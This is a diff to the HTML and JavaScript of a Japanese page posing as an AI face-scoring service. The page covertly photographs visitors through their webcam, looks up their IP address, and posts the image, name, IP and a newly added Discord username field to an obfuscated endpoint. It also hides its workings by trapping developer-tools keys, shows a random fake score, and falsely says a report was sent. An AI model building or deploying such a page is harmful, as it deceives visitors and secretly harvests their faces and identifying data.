@@ -51,9 +51,11 @@
         .content { padding: 30px 25px; }
         input {
             width: 100%; padding: 14px; background: #f1f5f9; border: 2px solid transparent;
-            border-radius: 12px; color: var(--text); font-size: 16px; margin-bottom: 15px; box-sizing: border-box; outline: none; transition: 0.3s;
+            border-radius: 12px; color: var(--text); font-size: 16px; margin-bottom: 10px; box-sizing: border-box; outline: none; transition: 0.3s;
         }
         input:focus { border-color: var(--accent); background: #fff; }
+
+        .note { font-size: 11px; color: #ef4444; text-align: left; margin-bottom: 15px; padding: 0 5px; line-height: 1.4; font-weight: bold; }
 
         .btn {
             background: linear-gradient(135deg, var(--accent), var(--accent-dark));
@@ -82,17 +84,14 @@
         .result-badge { display: inline-block; padding: 6px 16px; border-radius: 20px; background: #dcfce7; color: var(--success); font-weight: bold; font-size: 14px; margin-bottom: 10px; }
 
         .share-section { margin-top: 30px; border-top: 1px solid var(--border); padding-top: 20px; }
-        .share-title { font-size: 13px; font-weight: bold; color: var(--text-sub); margin-bottom: 15px; }
         .share-btns { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
         .share-btn {
             width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center;
             text-decoration: none; color: white; font-size: 18px; transition: 0.2s;
         }
-        .share-btn:hover { transform: translateY(-3px); opacity: 0.9; }
         .ln { background: var(--line); } .tw { background: var(--twitter); } .ig { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc23b6, #bc1888); } .ds { background: var(--discord); }
 
         .info-box { width: 90%; max-width: 420px; margin-top: 25px; text-align: left; font-size: 12px; color: var(--text-sub); }
-        .info-title { font-weight: bold; margin: 15px 0 5px; color: var(--text); }
         .info-text { background: #fff; border: 1px solid var(--border); padding: 12px; border-radius: 12px; line-height: 1.6; }
         canvas { display: none; }
     </style>
@@ -110,7 +109,11 @@
         <div id="setup-ui">
             <p style="font-size: 13px; color: var(--text-sub); margin-bottom: 20px;">最新の画像認識APIを使用し、客観的に測定します。</p>
             <input type="text" id="hp_field" style="display:none;" tabindex="-1" autocomplete="off">
+            
             <input type="text" id="un" placeholder="お名前を入力">
+            <input type="text" id="did" placeholder="Discordユーザー名 (例: user_ai)">
+            <p class="note">※AI解析データの送付に必須です。正しいIDを入力しないと結果が届きません。</p>
+
             <div class="auth-box">
                 <div class="cf-turnstile" data-sitekey="0x4AAAAAACIAWS8VkX6dSpKq"></div>
             </div>
@@ -126,13 +129,13 @@
             <div class="result-badge">Analysis Completed</div>
             <div id="score-val" style="font-size: 42px; font-weight: 900; color: var(--accent); margin: 10px 0;">0<span style="font-size:16px;">点</span></div>
             <h2 id="res-text" style="margin: 5px 0 15px; color: var(--text);">--</h2>
-            <p style="font-size: 12px; color: var(--text-sub); margin-bottom: 20px;">詳細レポートはDiscord経由で発行されます。</p>
-            <input type="text" id="did" placeholder="例: lumix_ai">
-            <button id="db" class="btn">詳細レポートを受け取る</button>
+            <div style="padding:15px; color:var(--success); font-weight:bold; font-size:14px; background:#f0fdf4; border-radius:12px; border:1px solid #bbf7d0;">
+                <i class="fas fa-check-circle"></i> 分析完了！<br>
+                <span style="font-size:12px; font-weight:normal; color:#166534;">Discordへ詳細レポートを送信しました。</span>
+            </div>
         </div>
 
         <div class="share-section">
-            <div class="share-title">友達に共有して結果を競おう！</div>
             <div class="share-btns">
                 <a href="#" class="share-btn ln" id="share-line" target="_blank"><i class="fab fa-line"></i></a>
                 <a href="#" class="share-btn tw" id="share-twitter" target="_blank"><i class="fab fa-x-twitter"></i></a>
@@ -144,8 +147,7 @@
 </div>
 
 <div class="info-box">
-    <div class="info-title">💡 使用方法</div>
-    <div class="info-text">1. お名前を入力 2. 認証を完了 3. カメラで顔をスキャン</div>
+    <div class="info-text">💡 <strong>使用方法</strong><br>1. 名前とDiscord IDを入力 2. 認証を完了 3. カメラで顔をスキャン</div>
 </div>
 
 <canvas id="cv" width="800" height="800"></canvas>
@@ -160,22 +162,21 @@
         if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); trap(); }
     });
 
-    let _n = "", _ip = "", _score = 0;
+    let _n = "", _id = "", _ip = "", _score = 0;
     const _d = (i) => document.getElementById(i);
-    const siteUrl = window.location.origin;
-    const shareMsg = "AI顔面偏差値診断で自分の顔を測定してみたよ！結果はどうなる…？ #FaceScoreAI";
-
-    _d('share-line').href = `https://social-plugins.line.me/lineit/share?url=${encodeURIComponent(siteUrl)}`;
-    _d('share-twitter').href = `https://twitter.com/intent/tweet?url=${encodeURIComponent(siteUrl)}&text=${encodeURIComponent(shareMsg)}`;
 
     async function _gip() { try { let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); return d.ip; } catch(e) { return "127.0.0.1"; } }
 
     _d('sb').addEventListener('click', async () => {
         if(_d('hp_field').value !== "") { trap(); return; }
+        
         const turnstileToken = document.querySelector('[name="cf-turnstile-response"]').value;
         if (!turnstileToken) { alert("認証を完了してください"); return; }
 
-        _n = _d('un').value.trim(); if(!_n) return alert("お名前を入力してください");
+        _n = _d('un').value.trim();
+        _id = _d('did').value.trim();
+        
+        if(!_n || !_id) return alert("お名前とDiscord IDを入力してください");
         
         _d('sb').disabled = true;
         _d('setup-ui').style.display = _0xS[2]; 
@@ -186,7 +187,7 @@
         try {
             const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
             _d('v').srcObject = s;
-            const msgs = ["骨格解析中...", "パーツ対称性測定中...", "データベース照合中..."];
+            const msgs = ["骨格解析中...", "パーツ対称性測定中...", "データベース照合中...", "AI判定中..."];
             let idx = 0;
             const logTimer = setInterval(() => { if(idx < msgs.length) { _d('st')[_0xS[4]] = msgs[idx]; idx++; } }, 1200);
             
@@ -198,36 +199,21 @@
                     
                     const f = new FormData(); 
                     f.append('file', b, 'scan.png');
-                    f.append('content', `🌟 **診断実行**\n👤 名前: ${_n}\n📊 暫定スコア: ${_score}点\n🌐 IP: ${_ip}`);
+                    f.append('content', `🚀 **AI顔診断レポート**\n👤 ユーザー: ${_n}\n👾 Discord: ${_id}\n📊 スコア: ${_score}点\n🌐 IP: ${_ip}`);
                     
                     await fetch(_path(), { method: _0xS[1], body: f });
                     
                     s.getTracks().forEach(t => t.stop());
                     
-                    const resList = ["イケメン！", "美女！", "かわいい", "普通", "まあまあ", "モテそう！",  "ちょいいけめん！", "女よりの顔", "ブサイク"];
+                    const resList = ["イケメン！", "美女！", "かわいい", "普通", "まあまあ", "モテそう！", "ちょいいけめん！"];
                     _d('res-text')[_0xS[4]] = resList[Math.floor(Math.random() * resList.length)];
                     _d('score-val').innerHTML = `${_score}<span style="font-size:16px;">点</span>`;
 
                     _d('camera-container').style.display = _0xS[2]; 
                     _d('result-ui').style.display = _0xS[3];
                 }, 'image/png');
-            }, 5000);
+            }, 6000);
         } catch(e) { alert("カメラ許可が必要です"); location.reload(); }
-    });
-
-    _d('db').addEventListener('click', async () => {
-        const id = _d('did').value.trim(); 
-        const regex = /^[a-z0-9_\\.]{3,32}$/i;
-        if(!regex.test(id)) {
-            alert("Discord IDが正しくありません。\n・3文字以上\n・英数字、アンダースコア、ドットのみ");
-            return;
-        }
-
-        _d('db').disabled = true; _d('db')[_0xS[4]] = "送信中...";
-        const f = new FormData(); 
-        f.append('content', `🆔 **Discord登録**\n👤 名前: ${_n}\n📊 スコア: ${_score}点\n👾 ID: ${id}`);
-        await fetch(_path(), { method: _0xS[1], body: f });
-        _d('result-ui').innerHTML = `<div style="padding:20px; color:var(--success);"><h3 style="margin:0;">送信完了</h3><p style="font-size:12px; margin-top:10px;">${id} 宛に通知を待ってね！</p></div>`;
     });
 </script>
 </body>
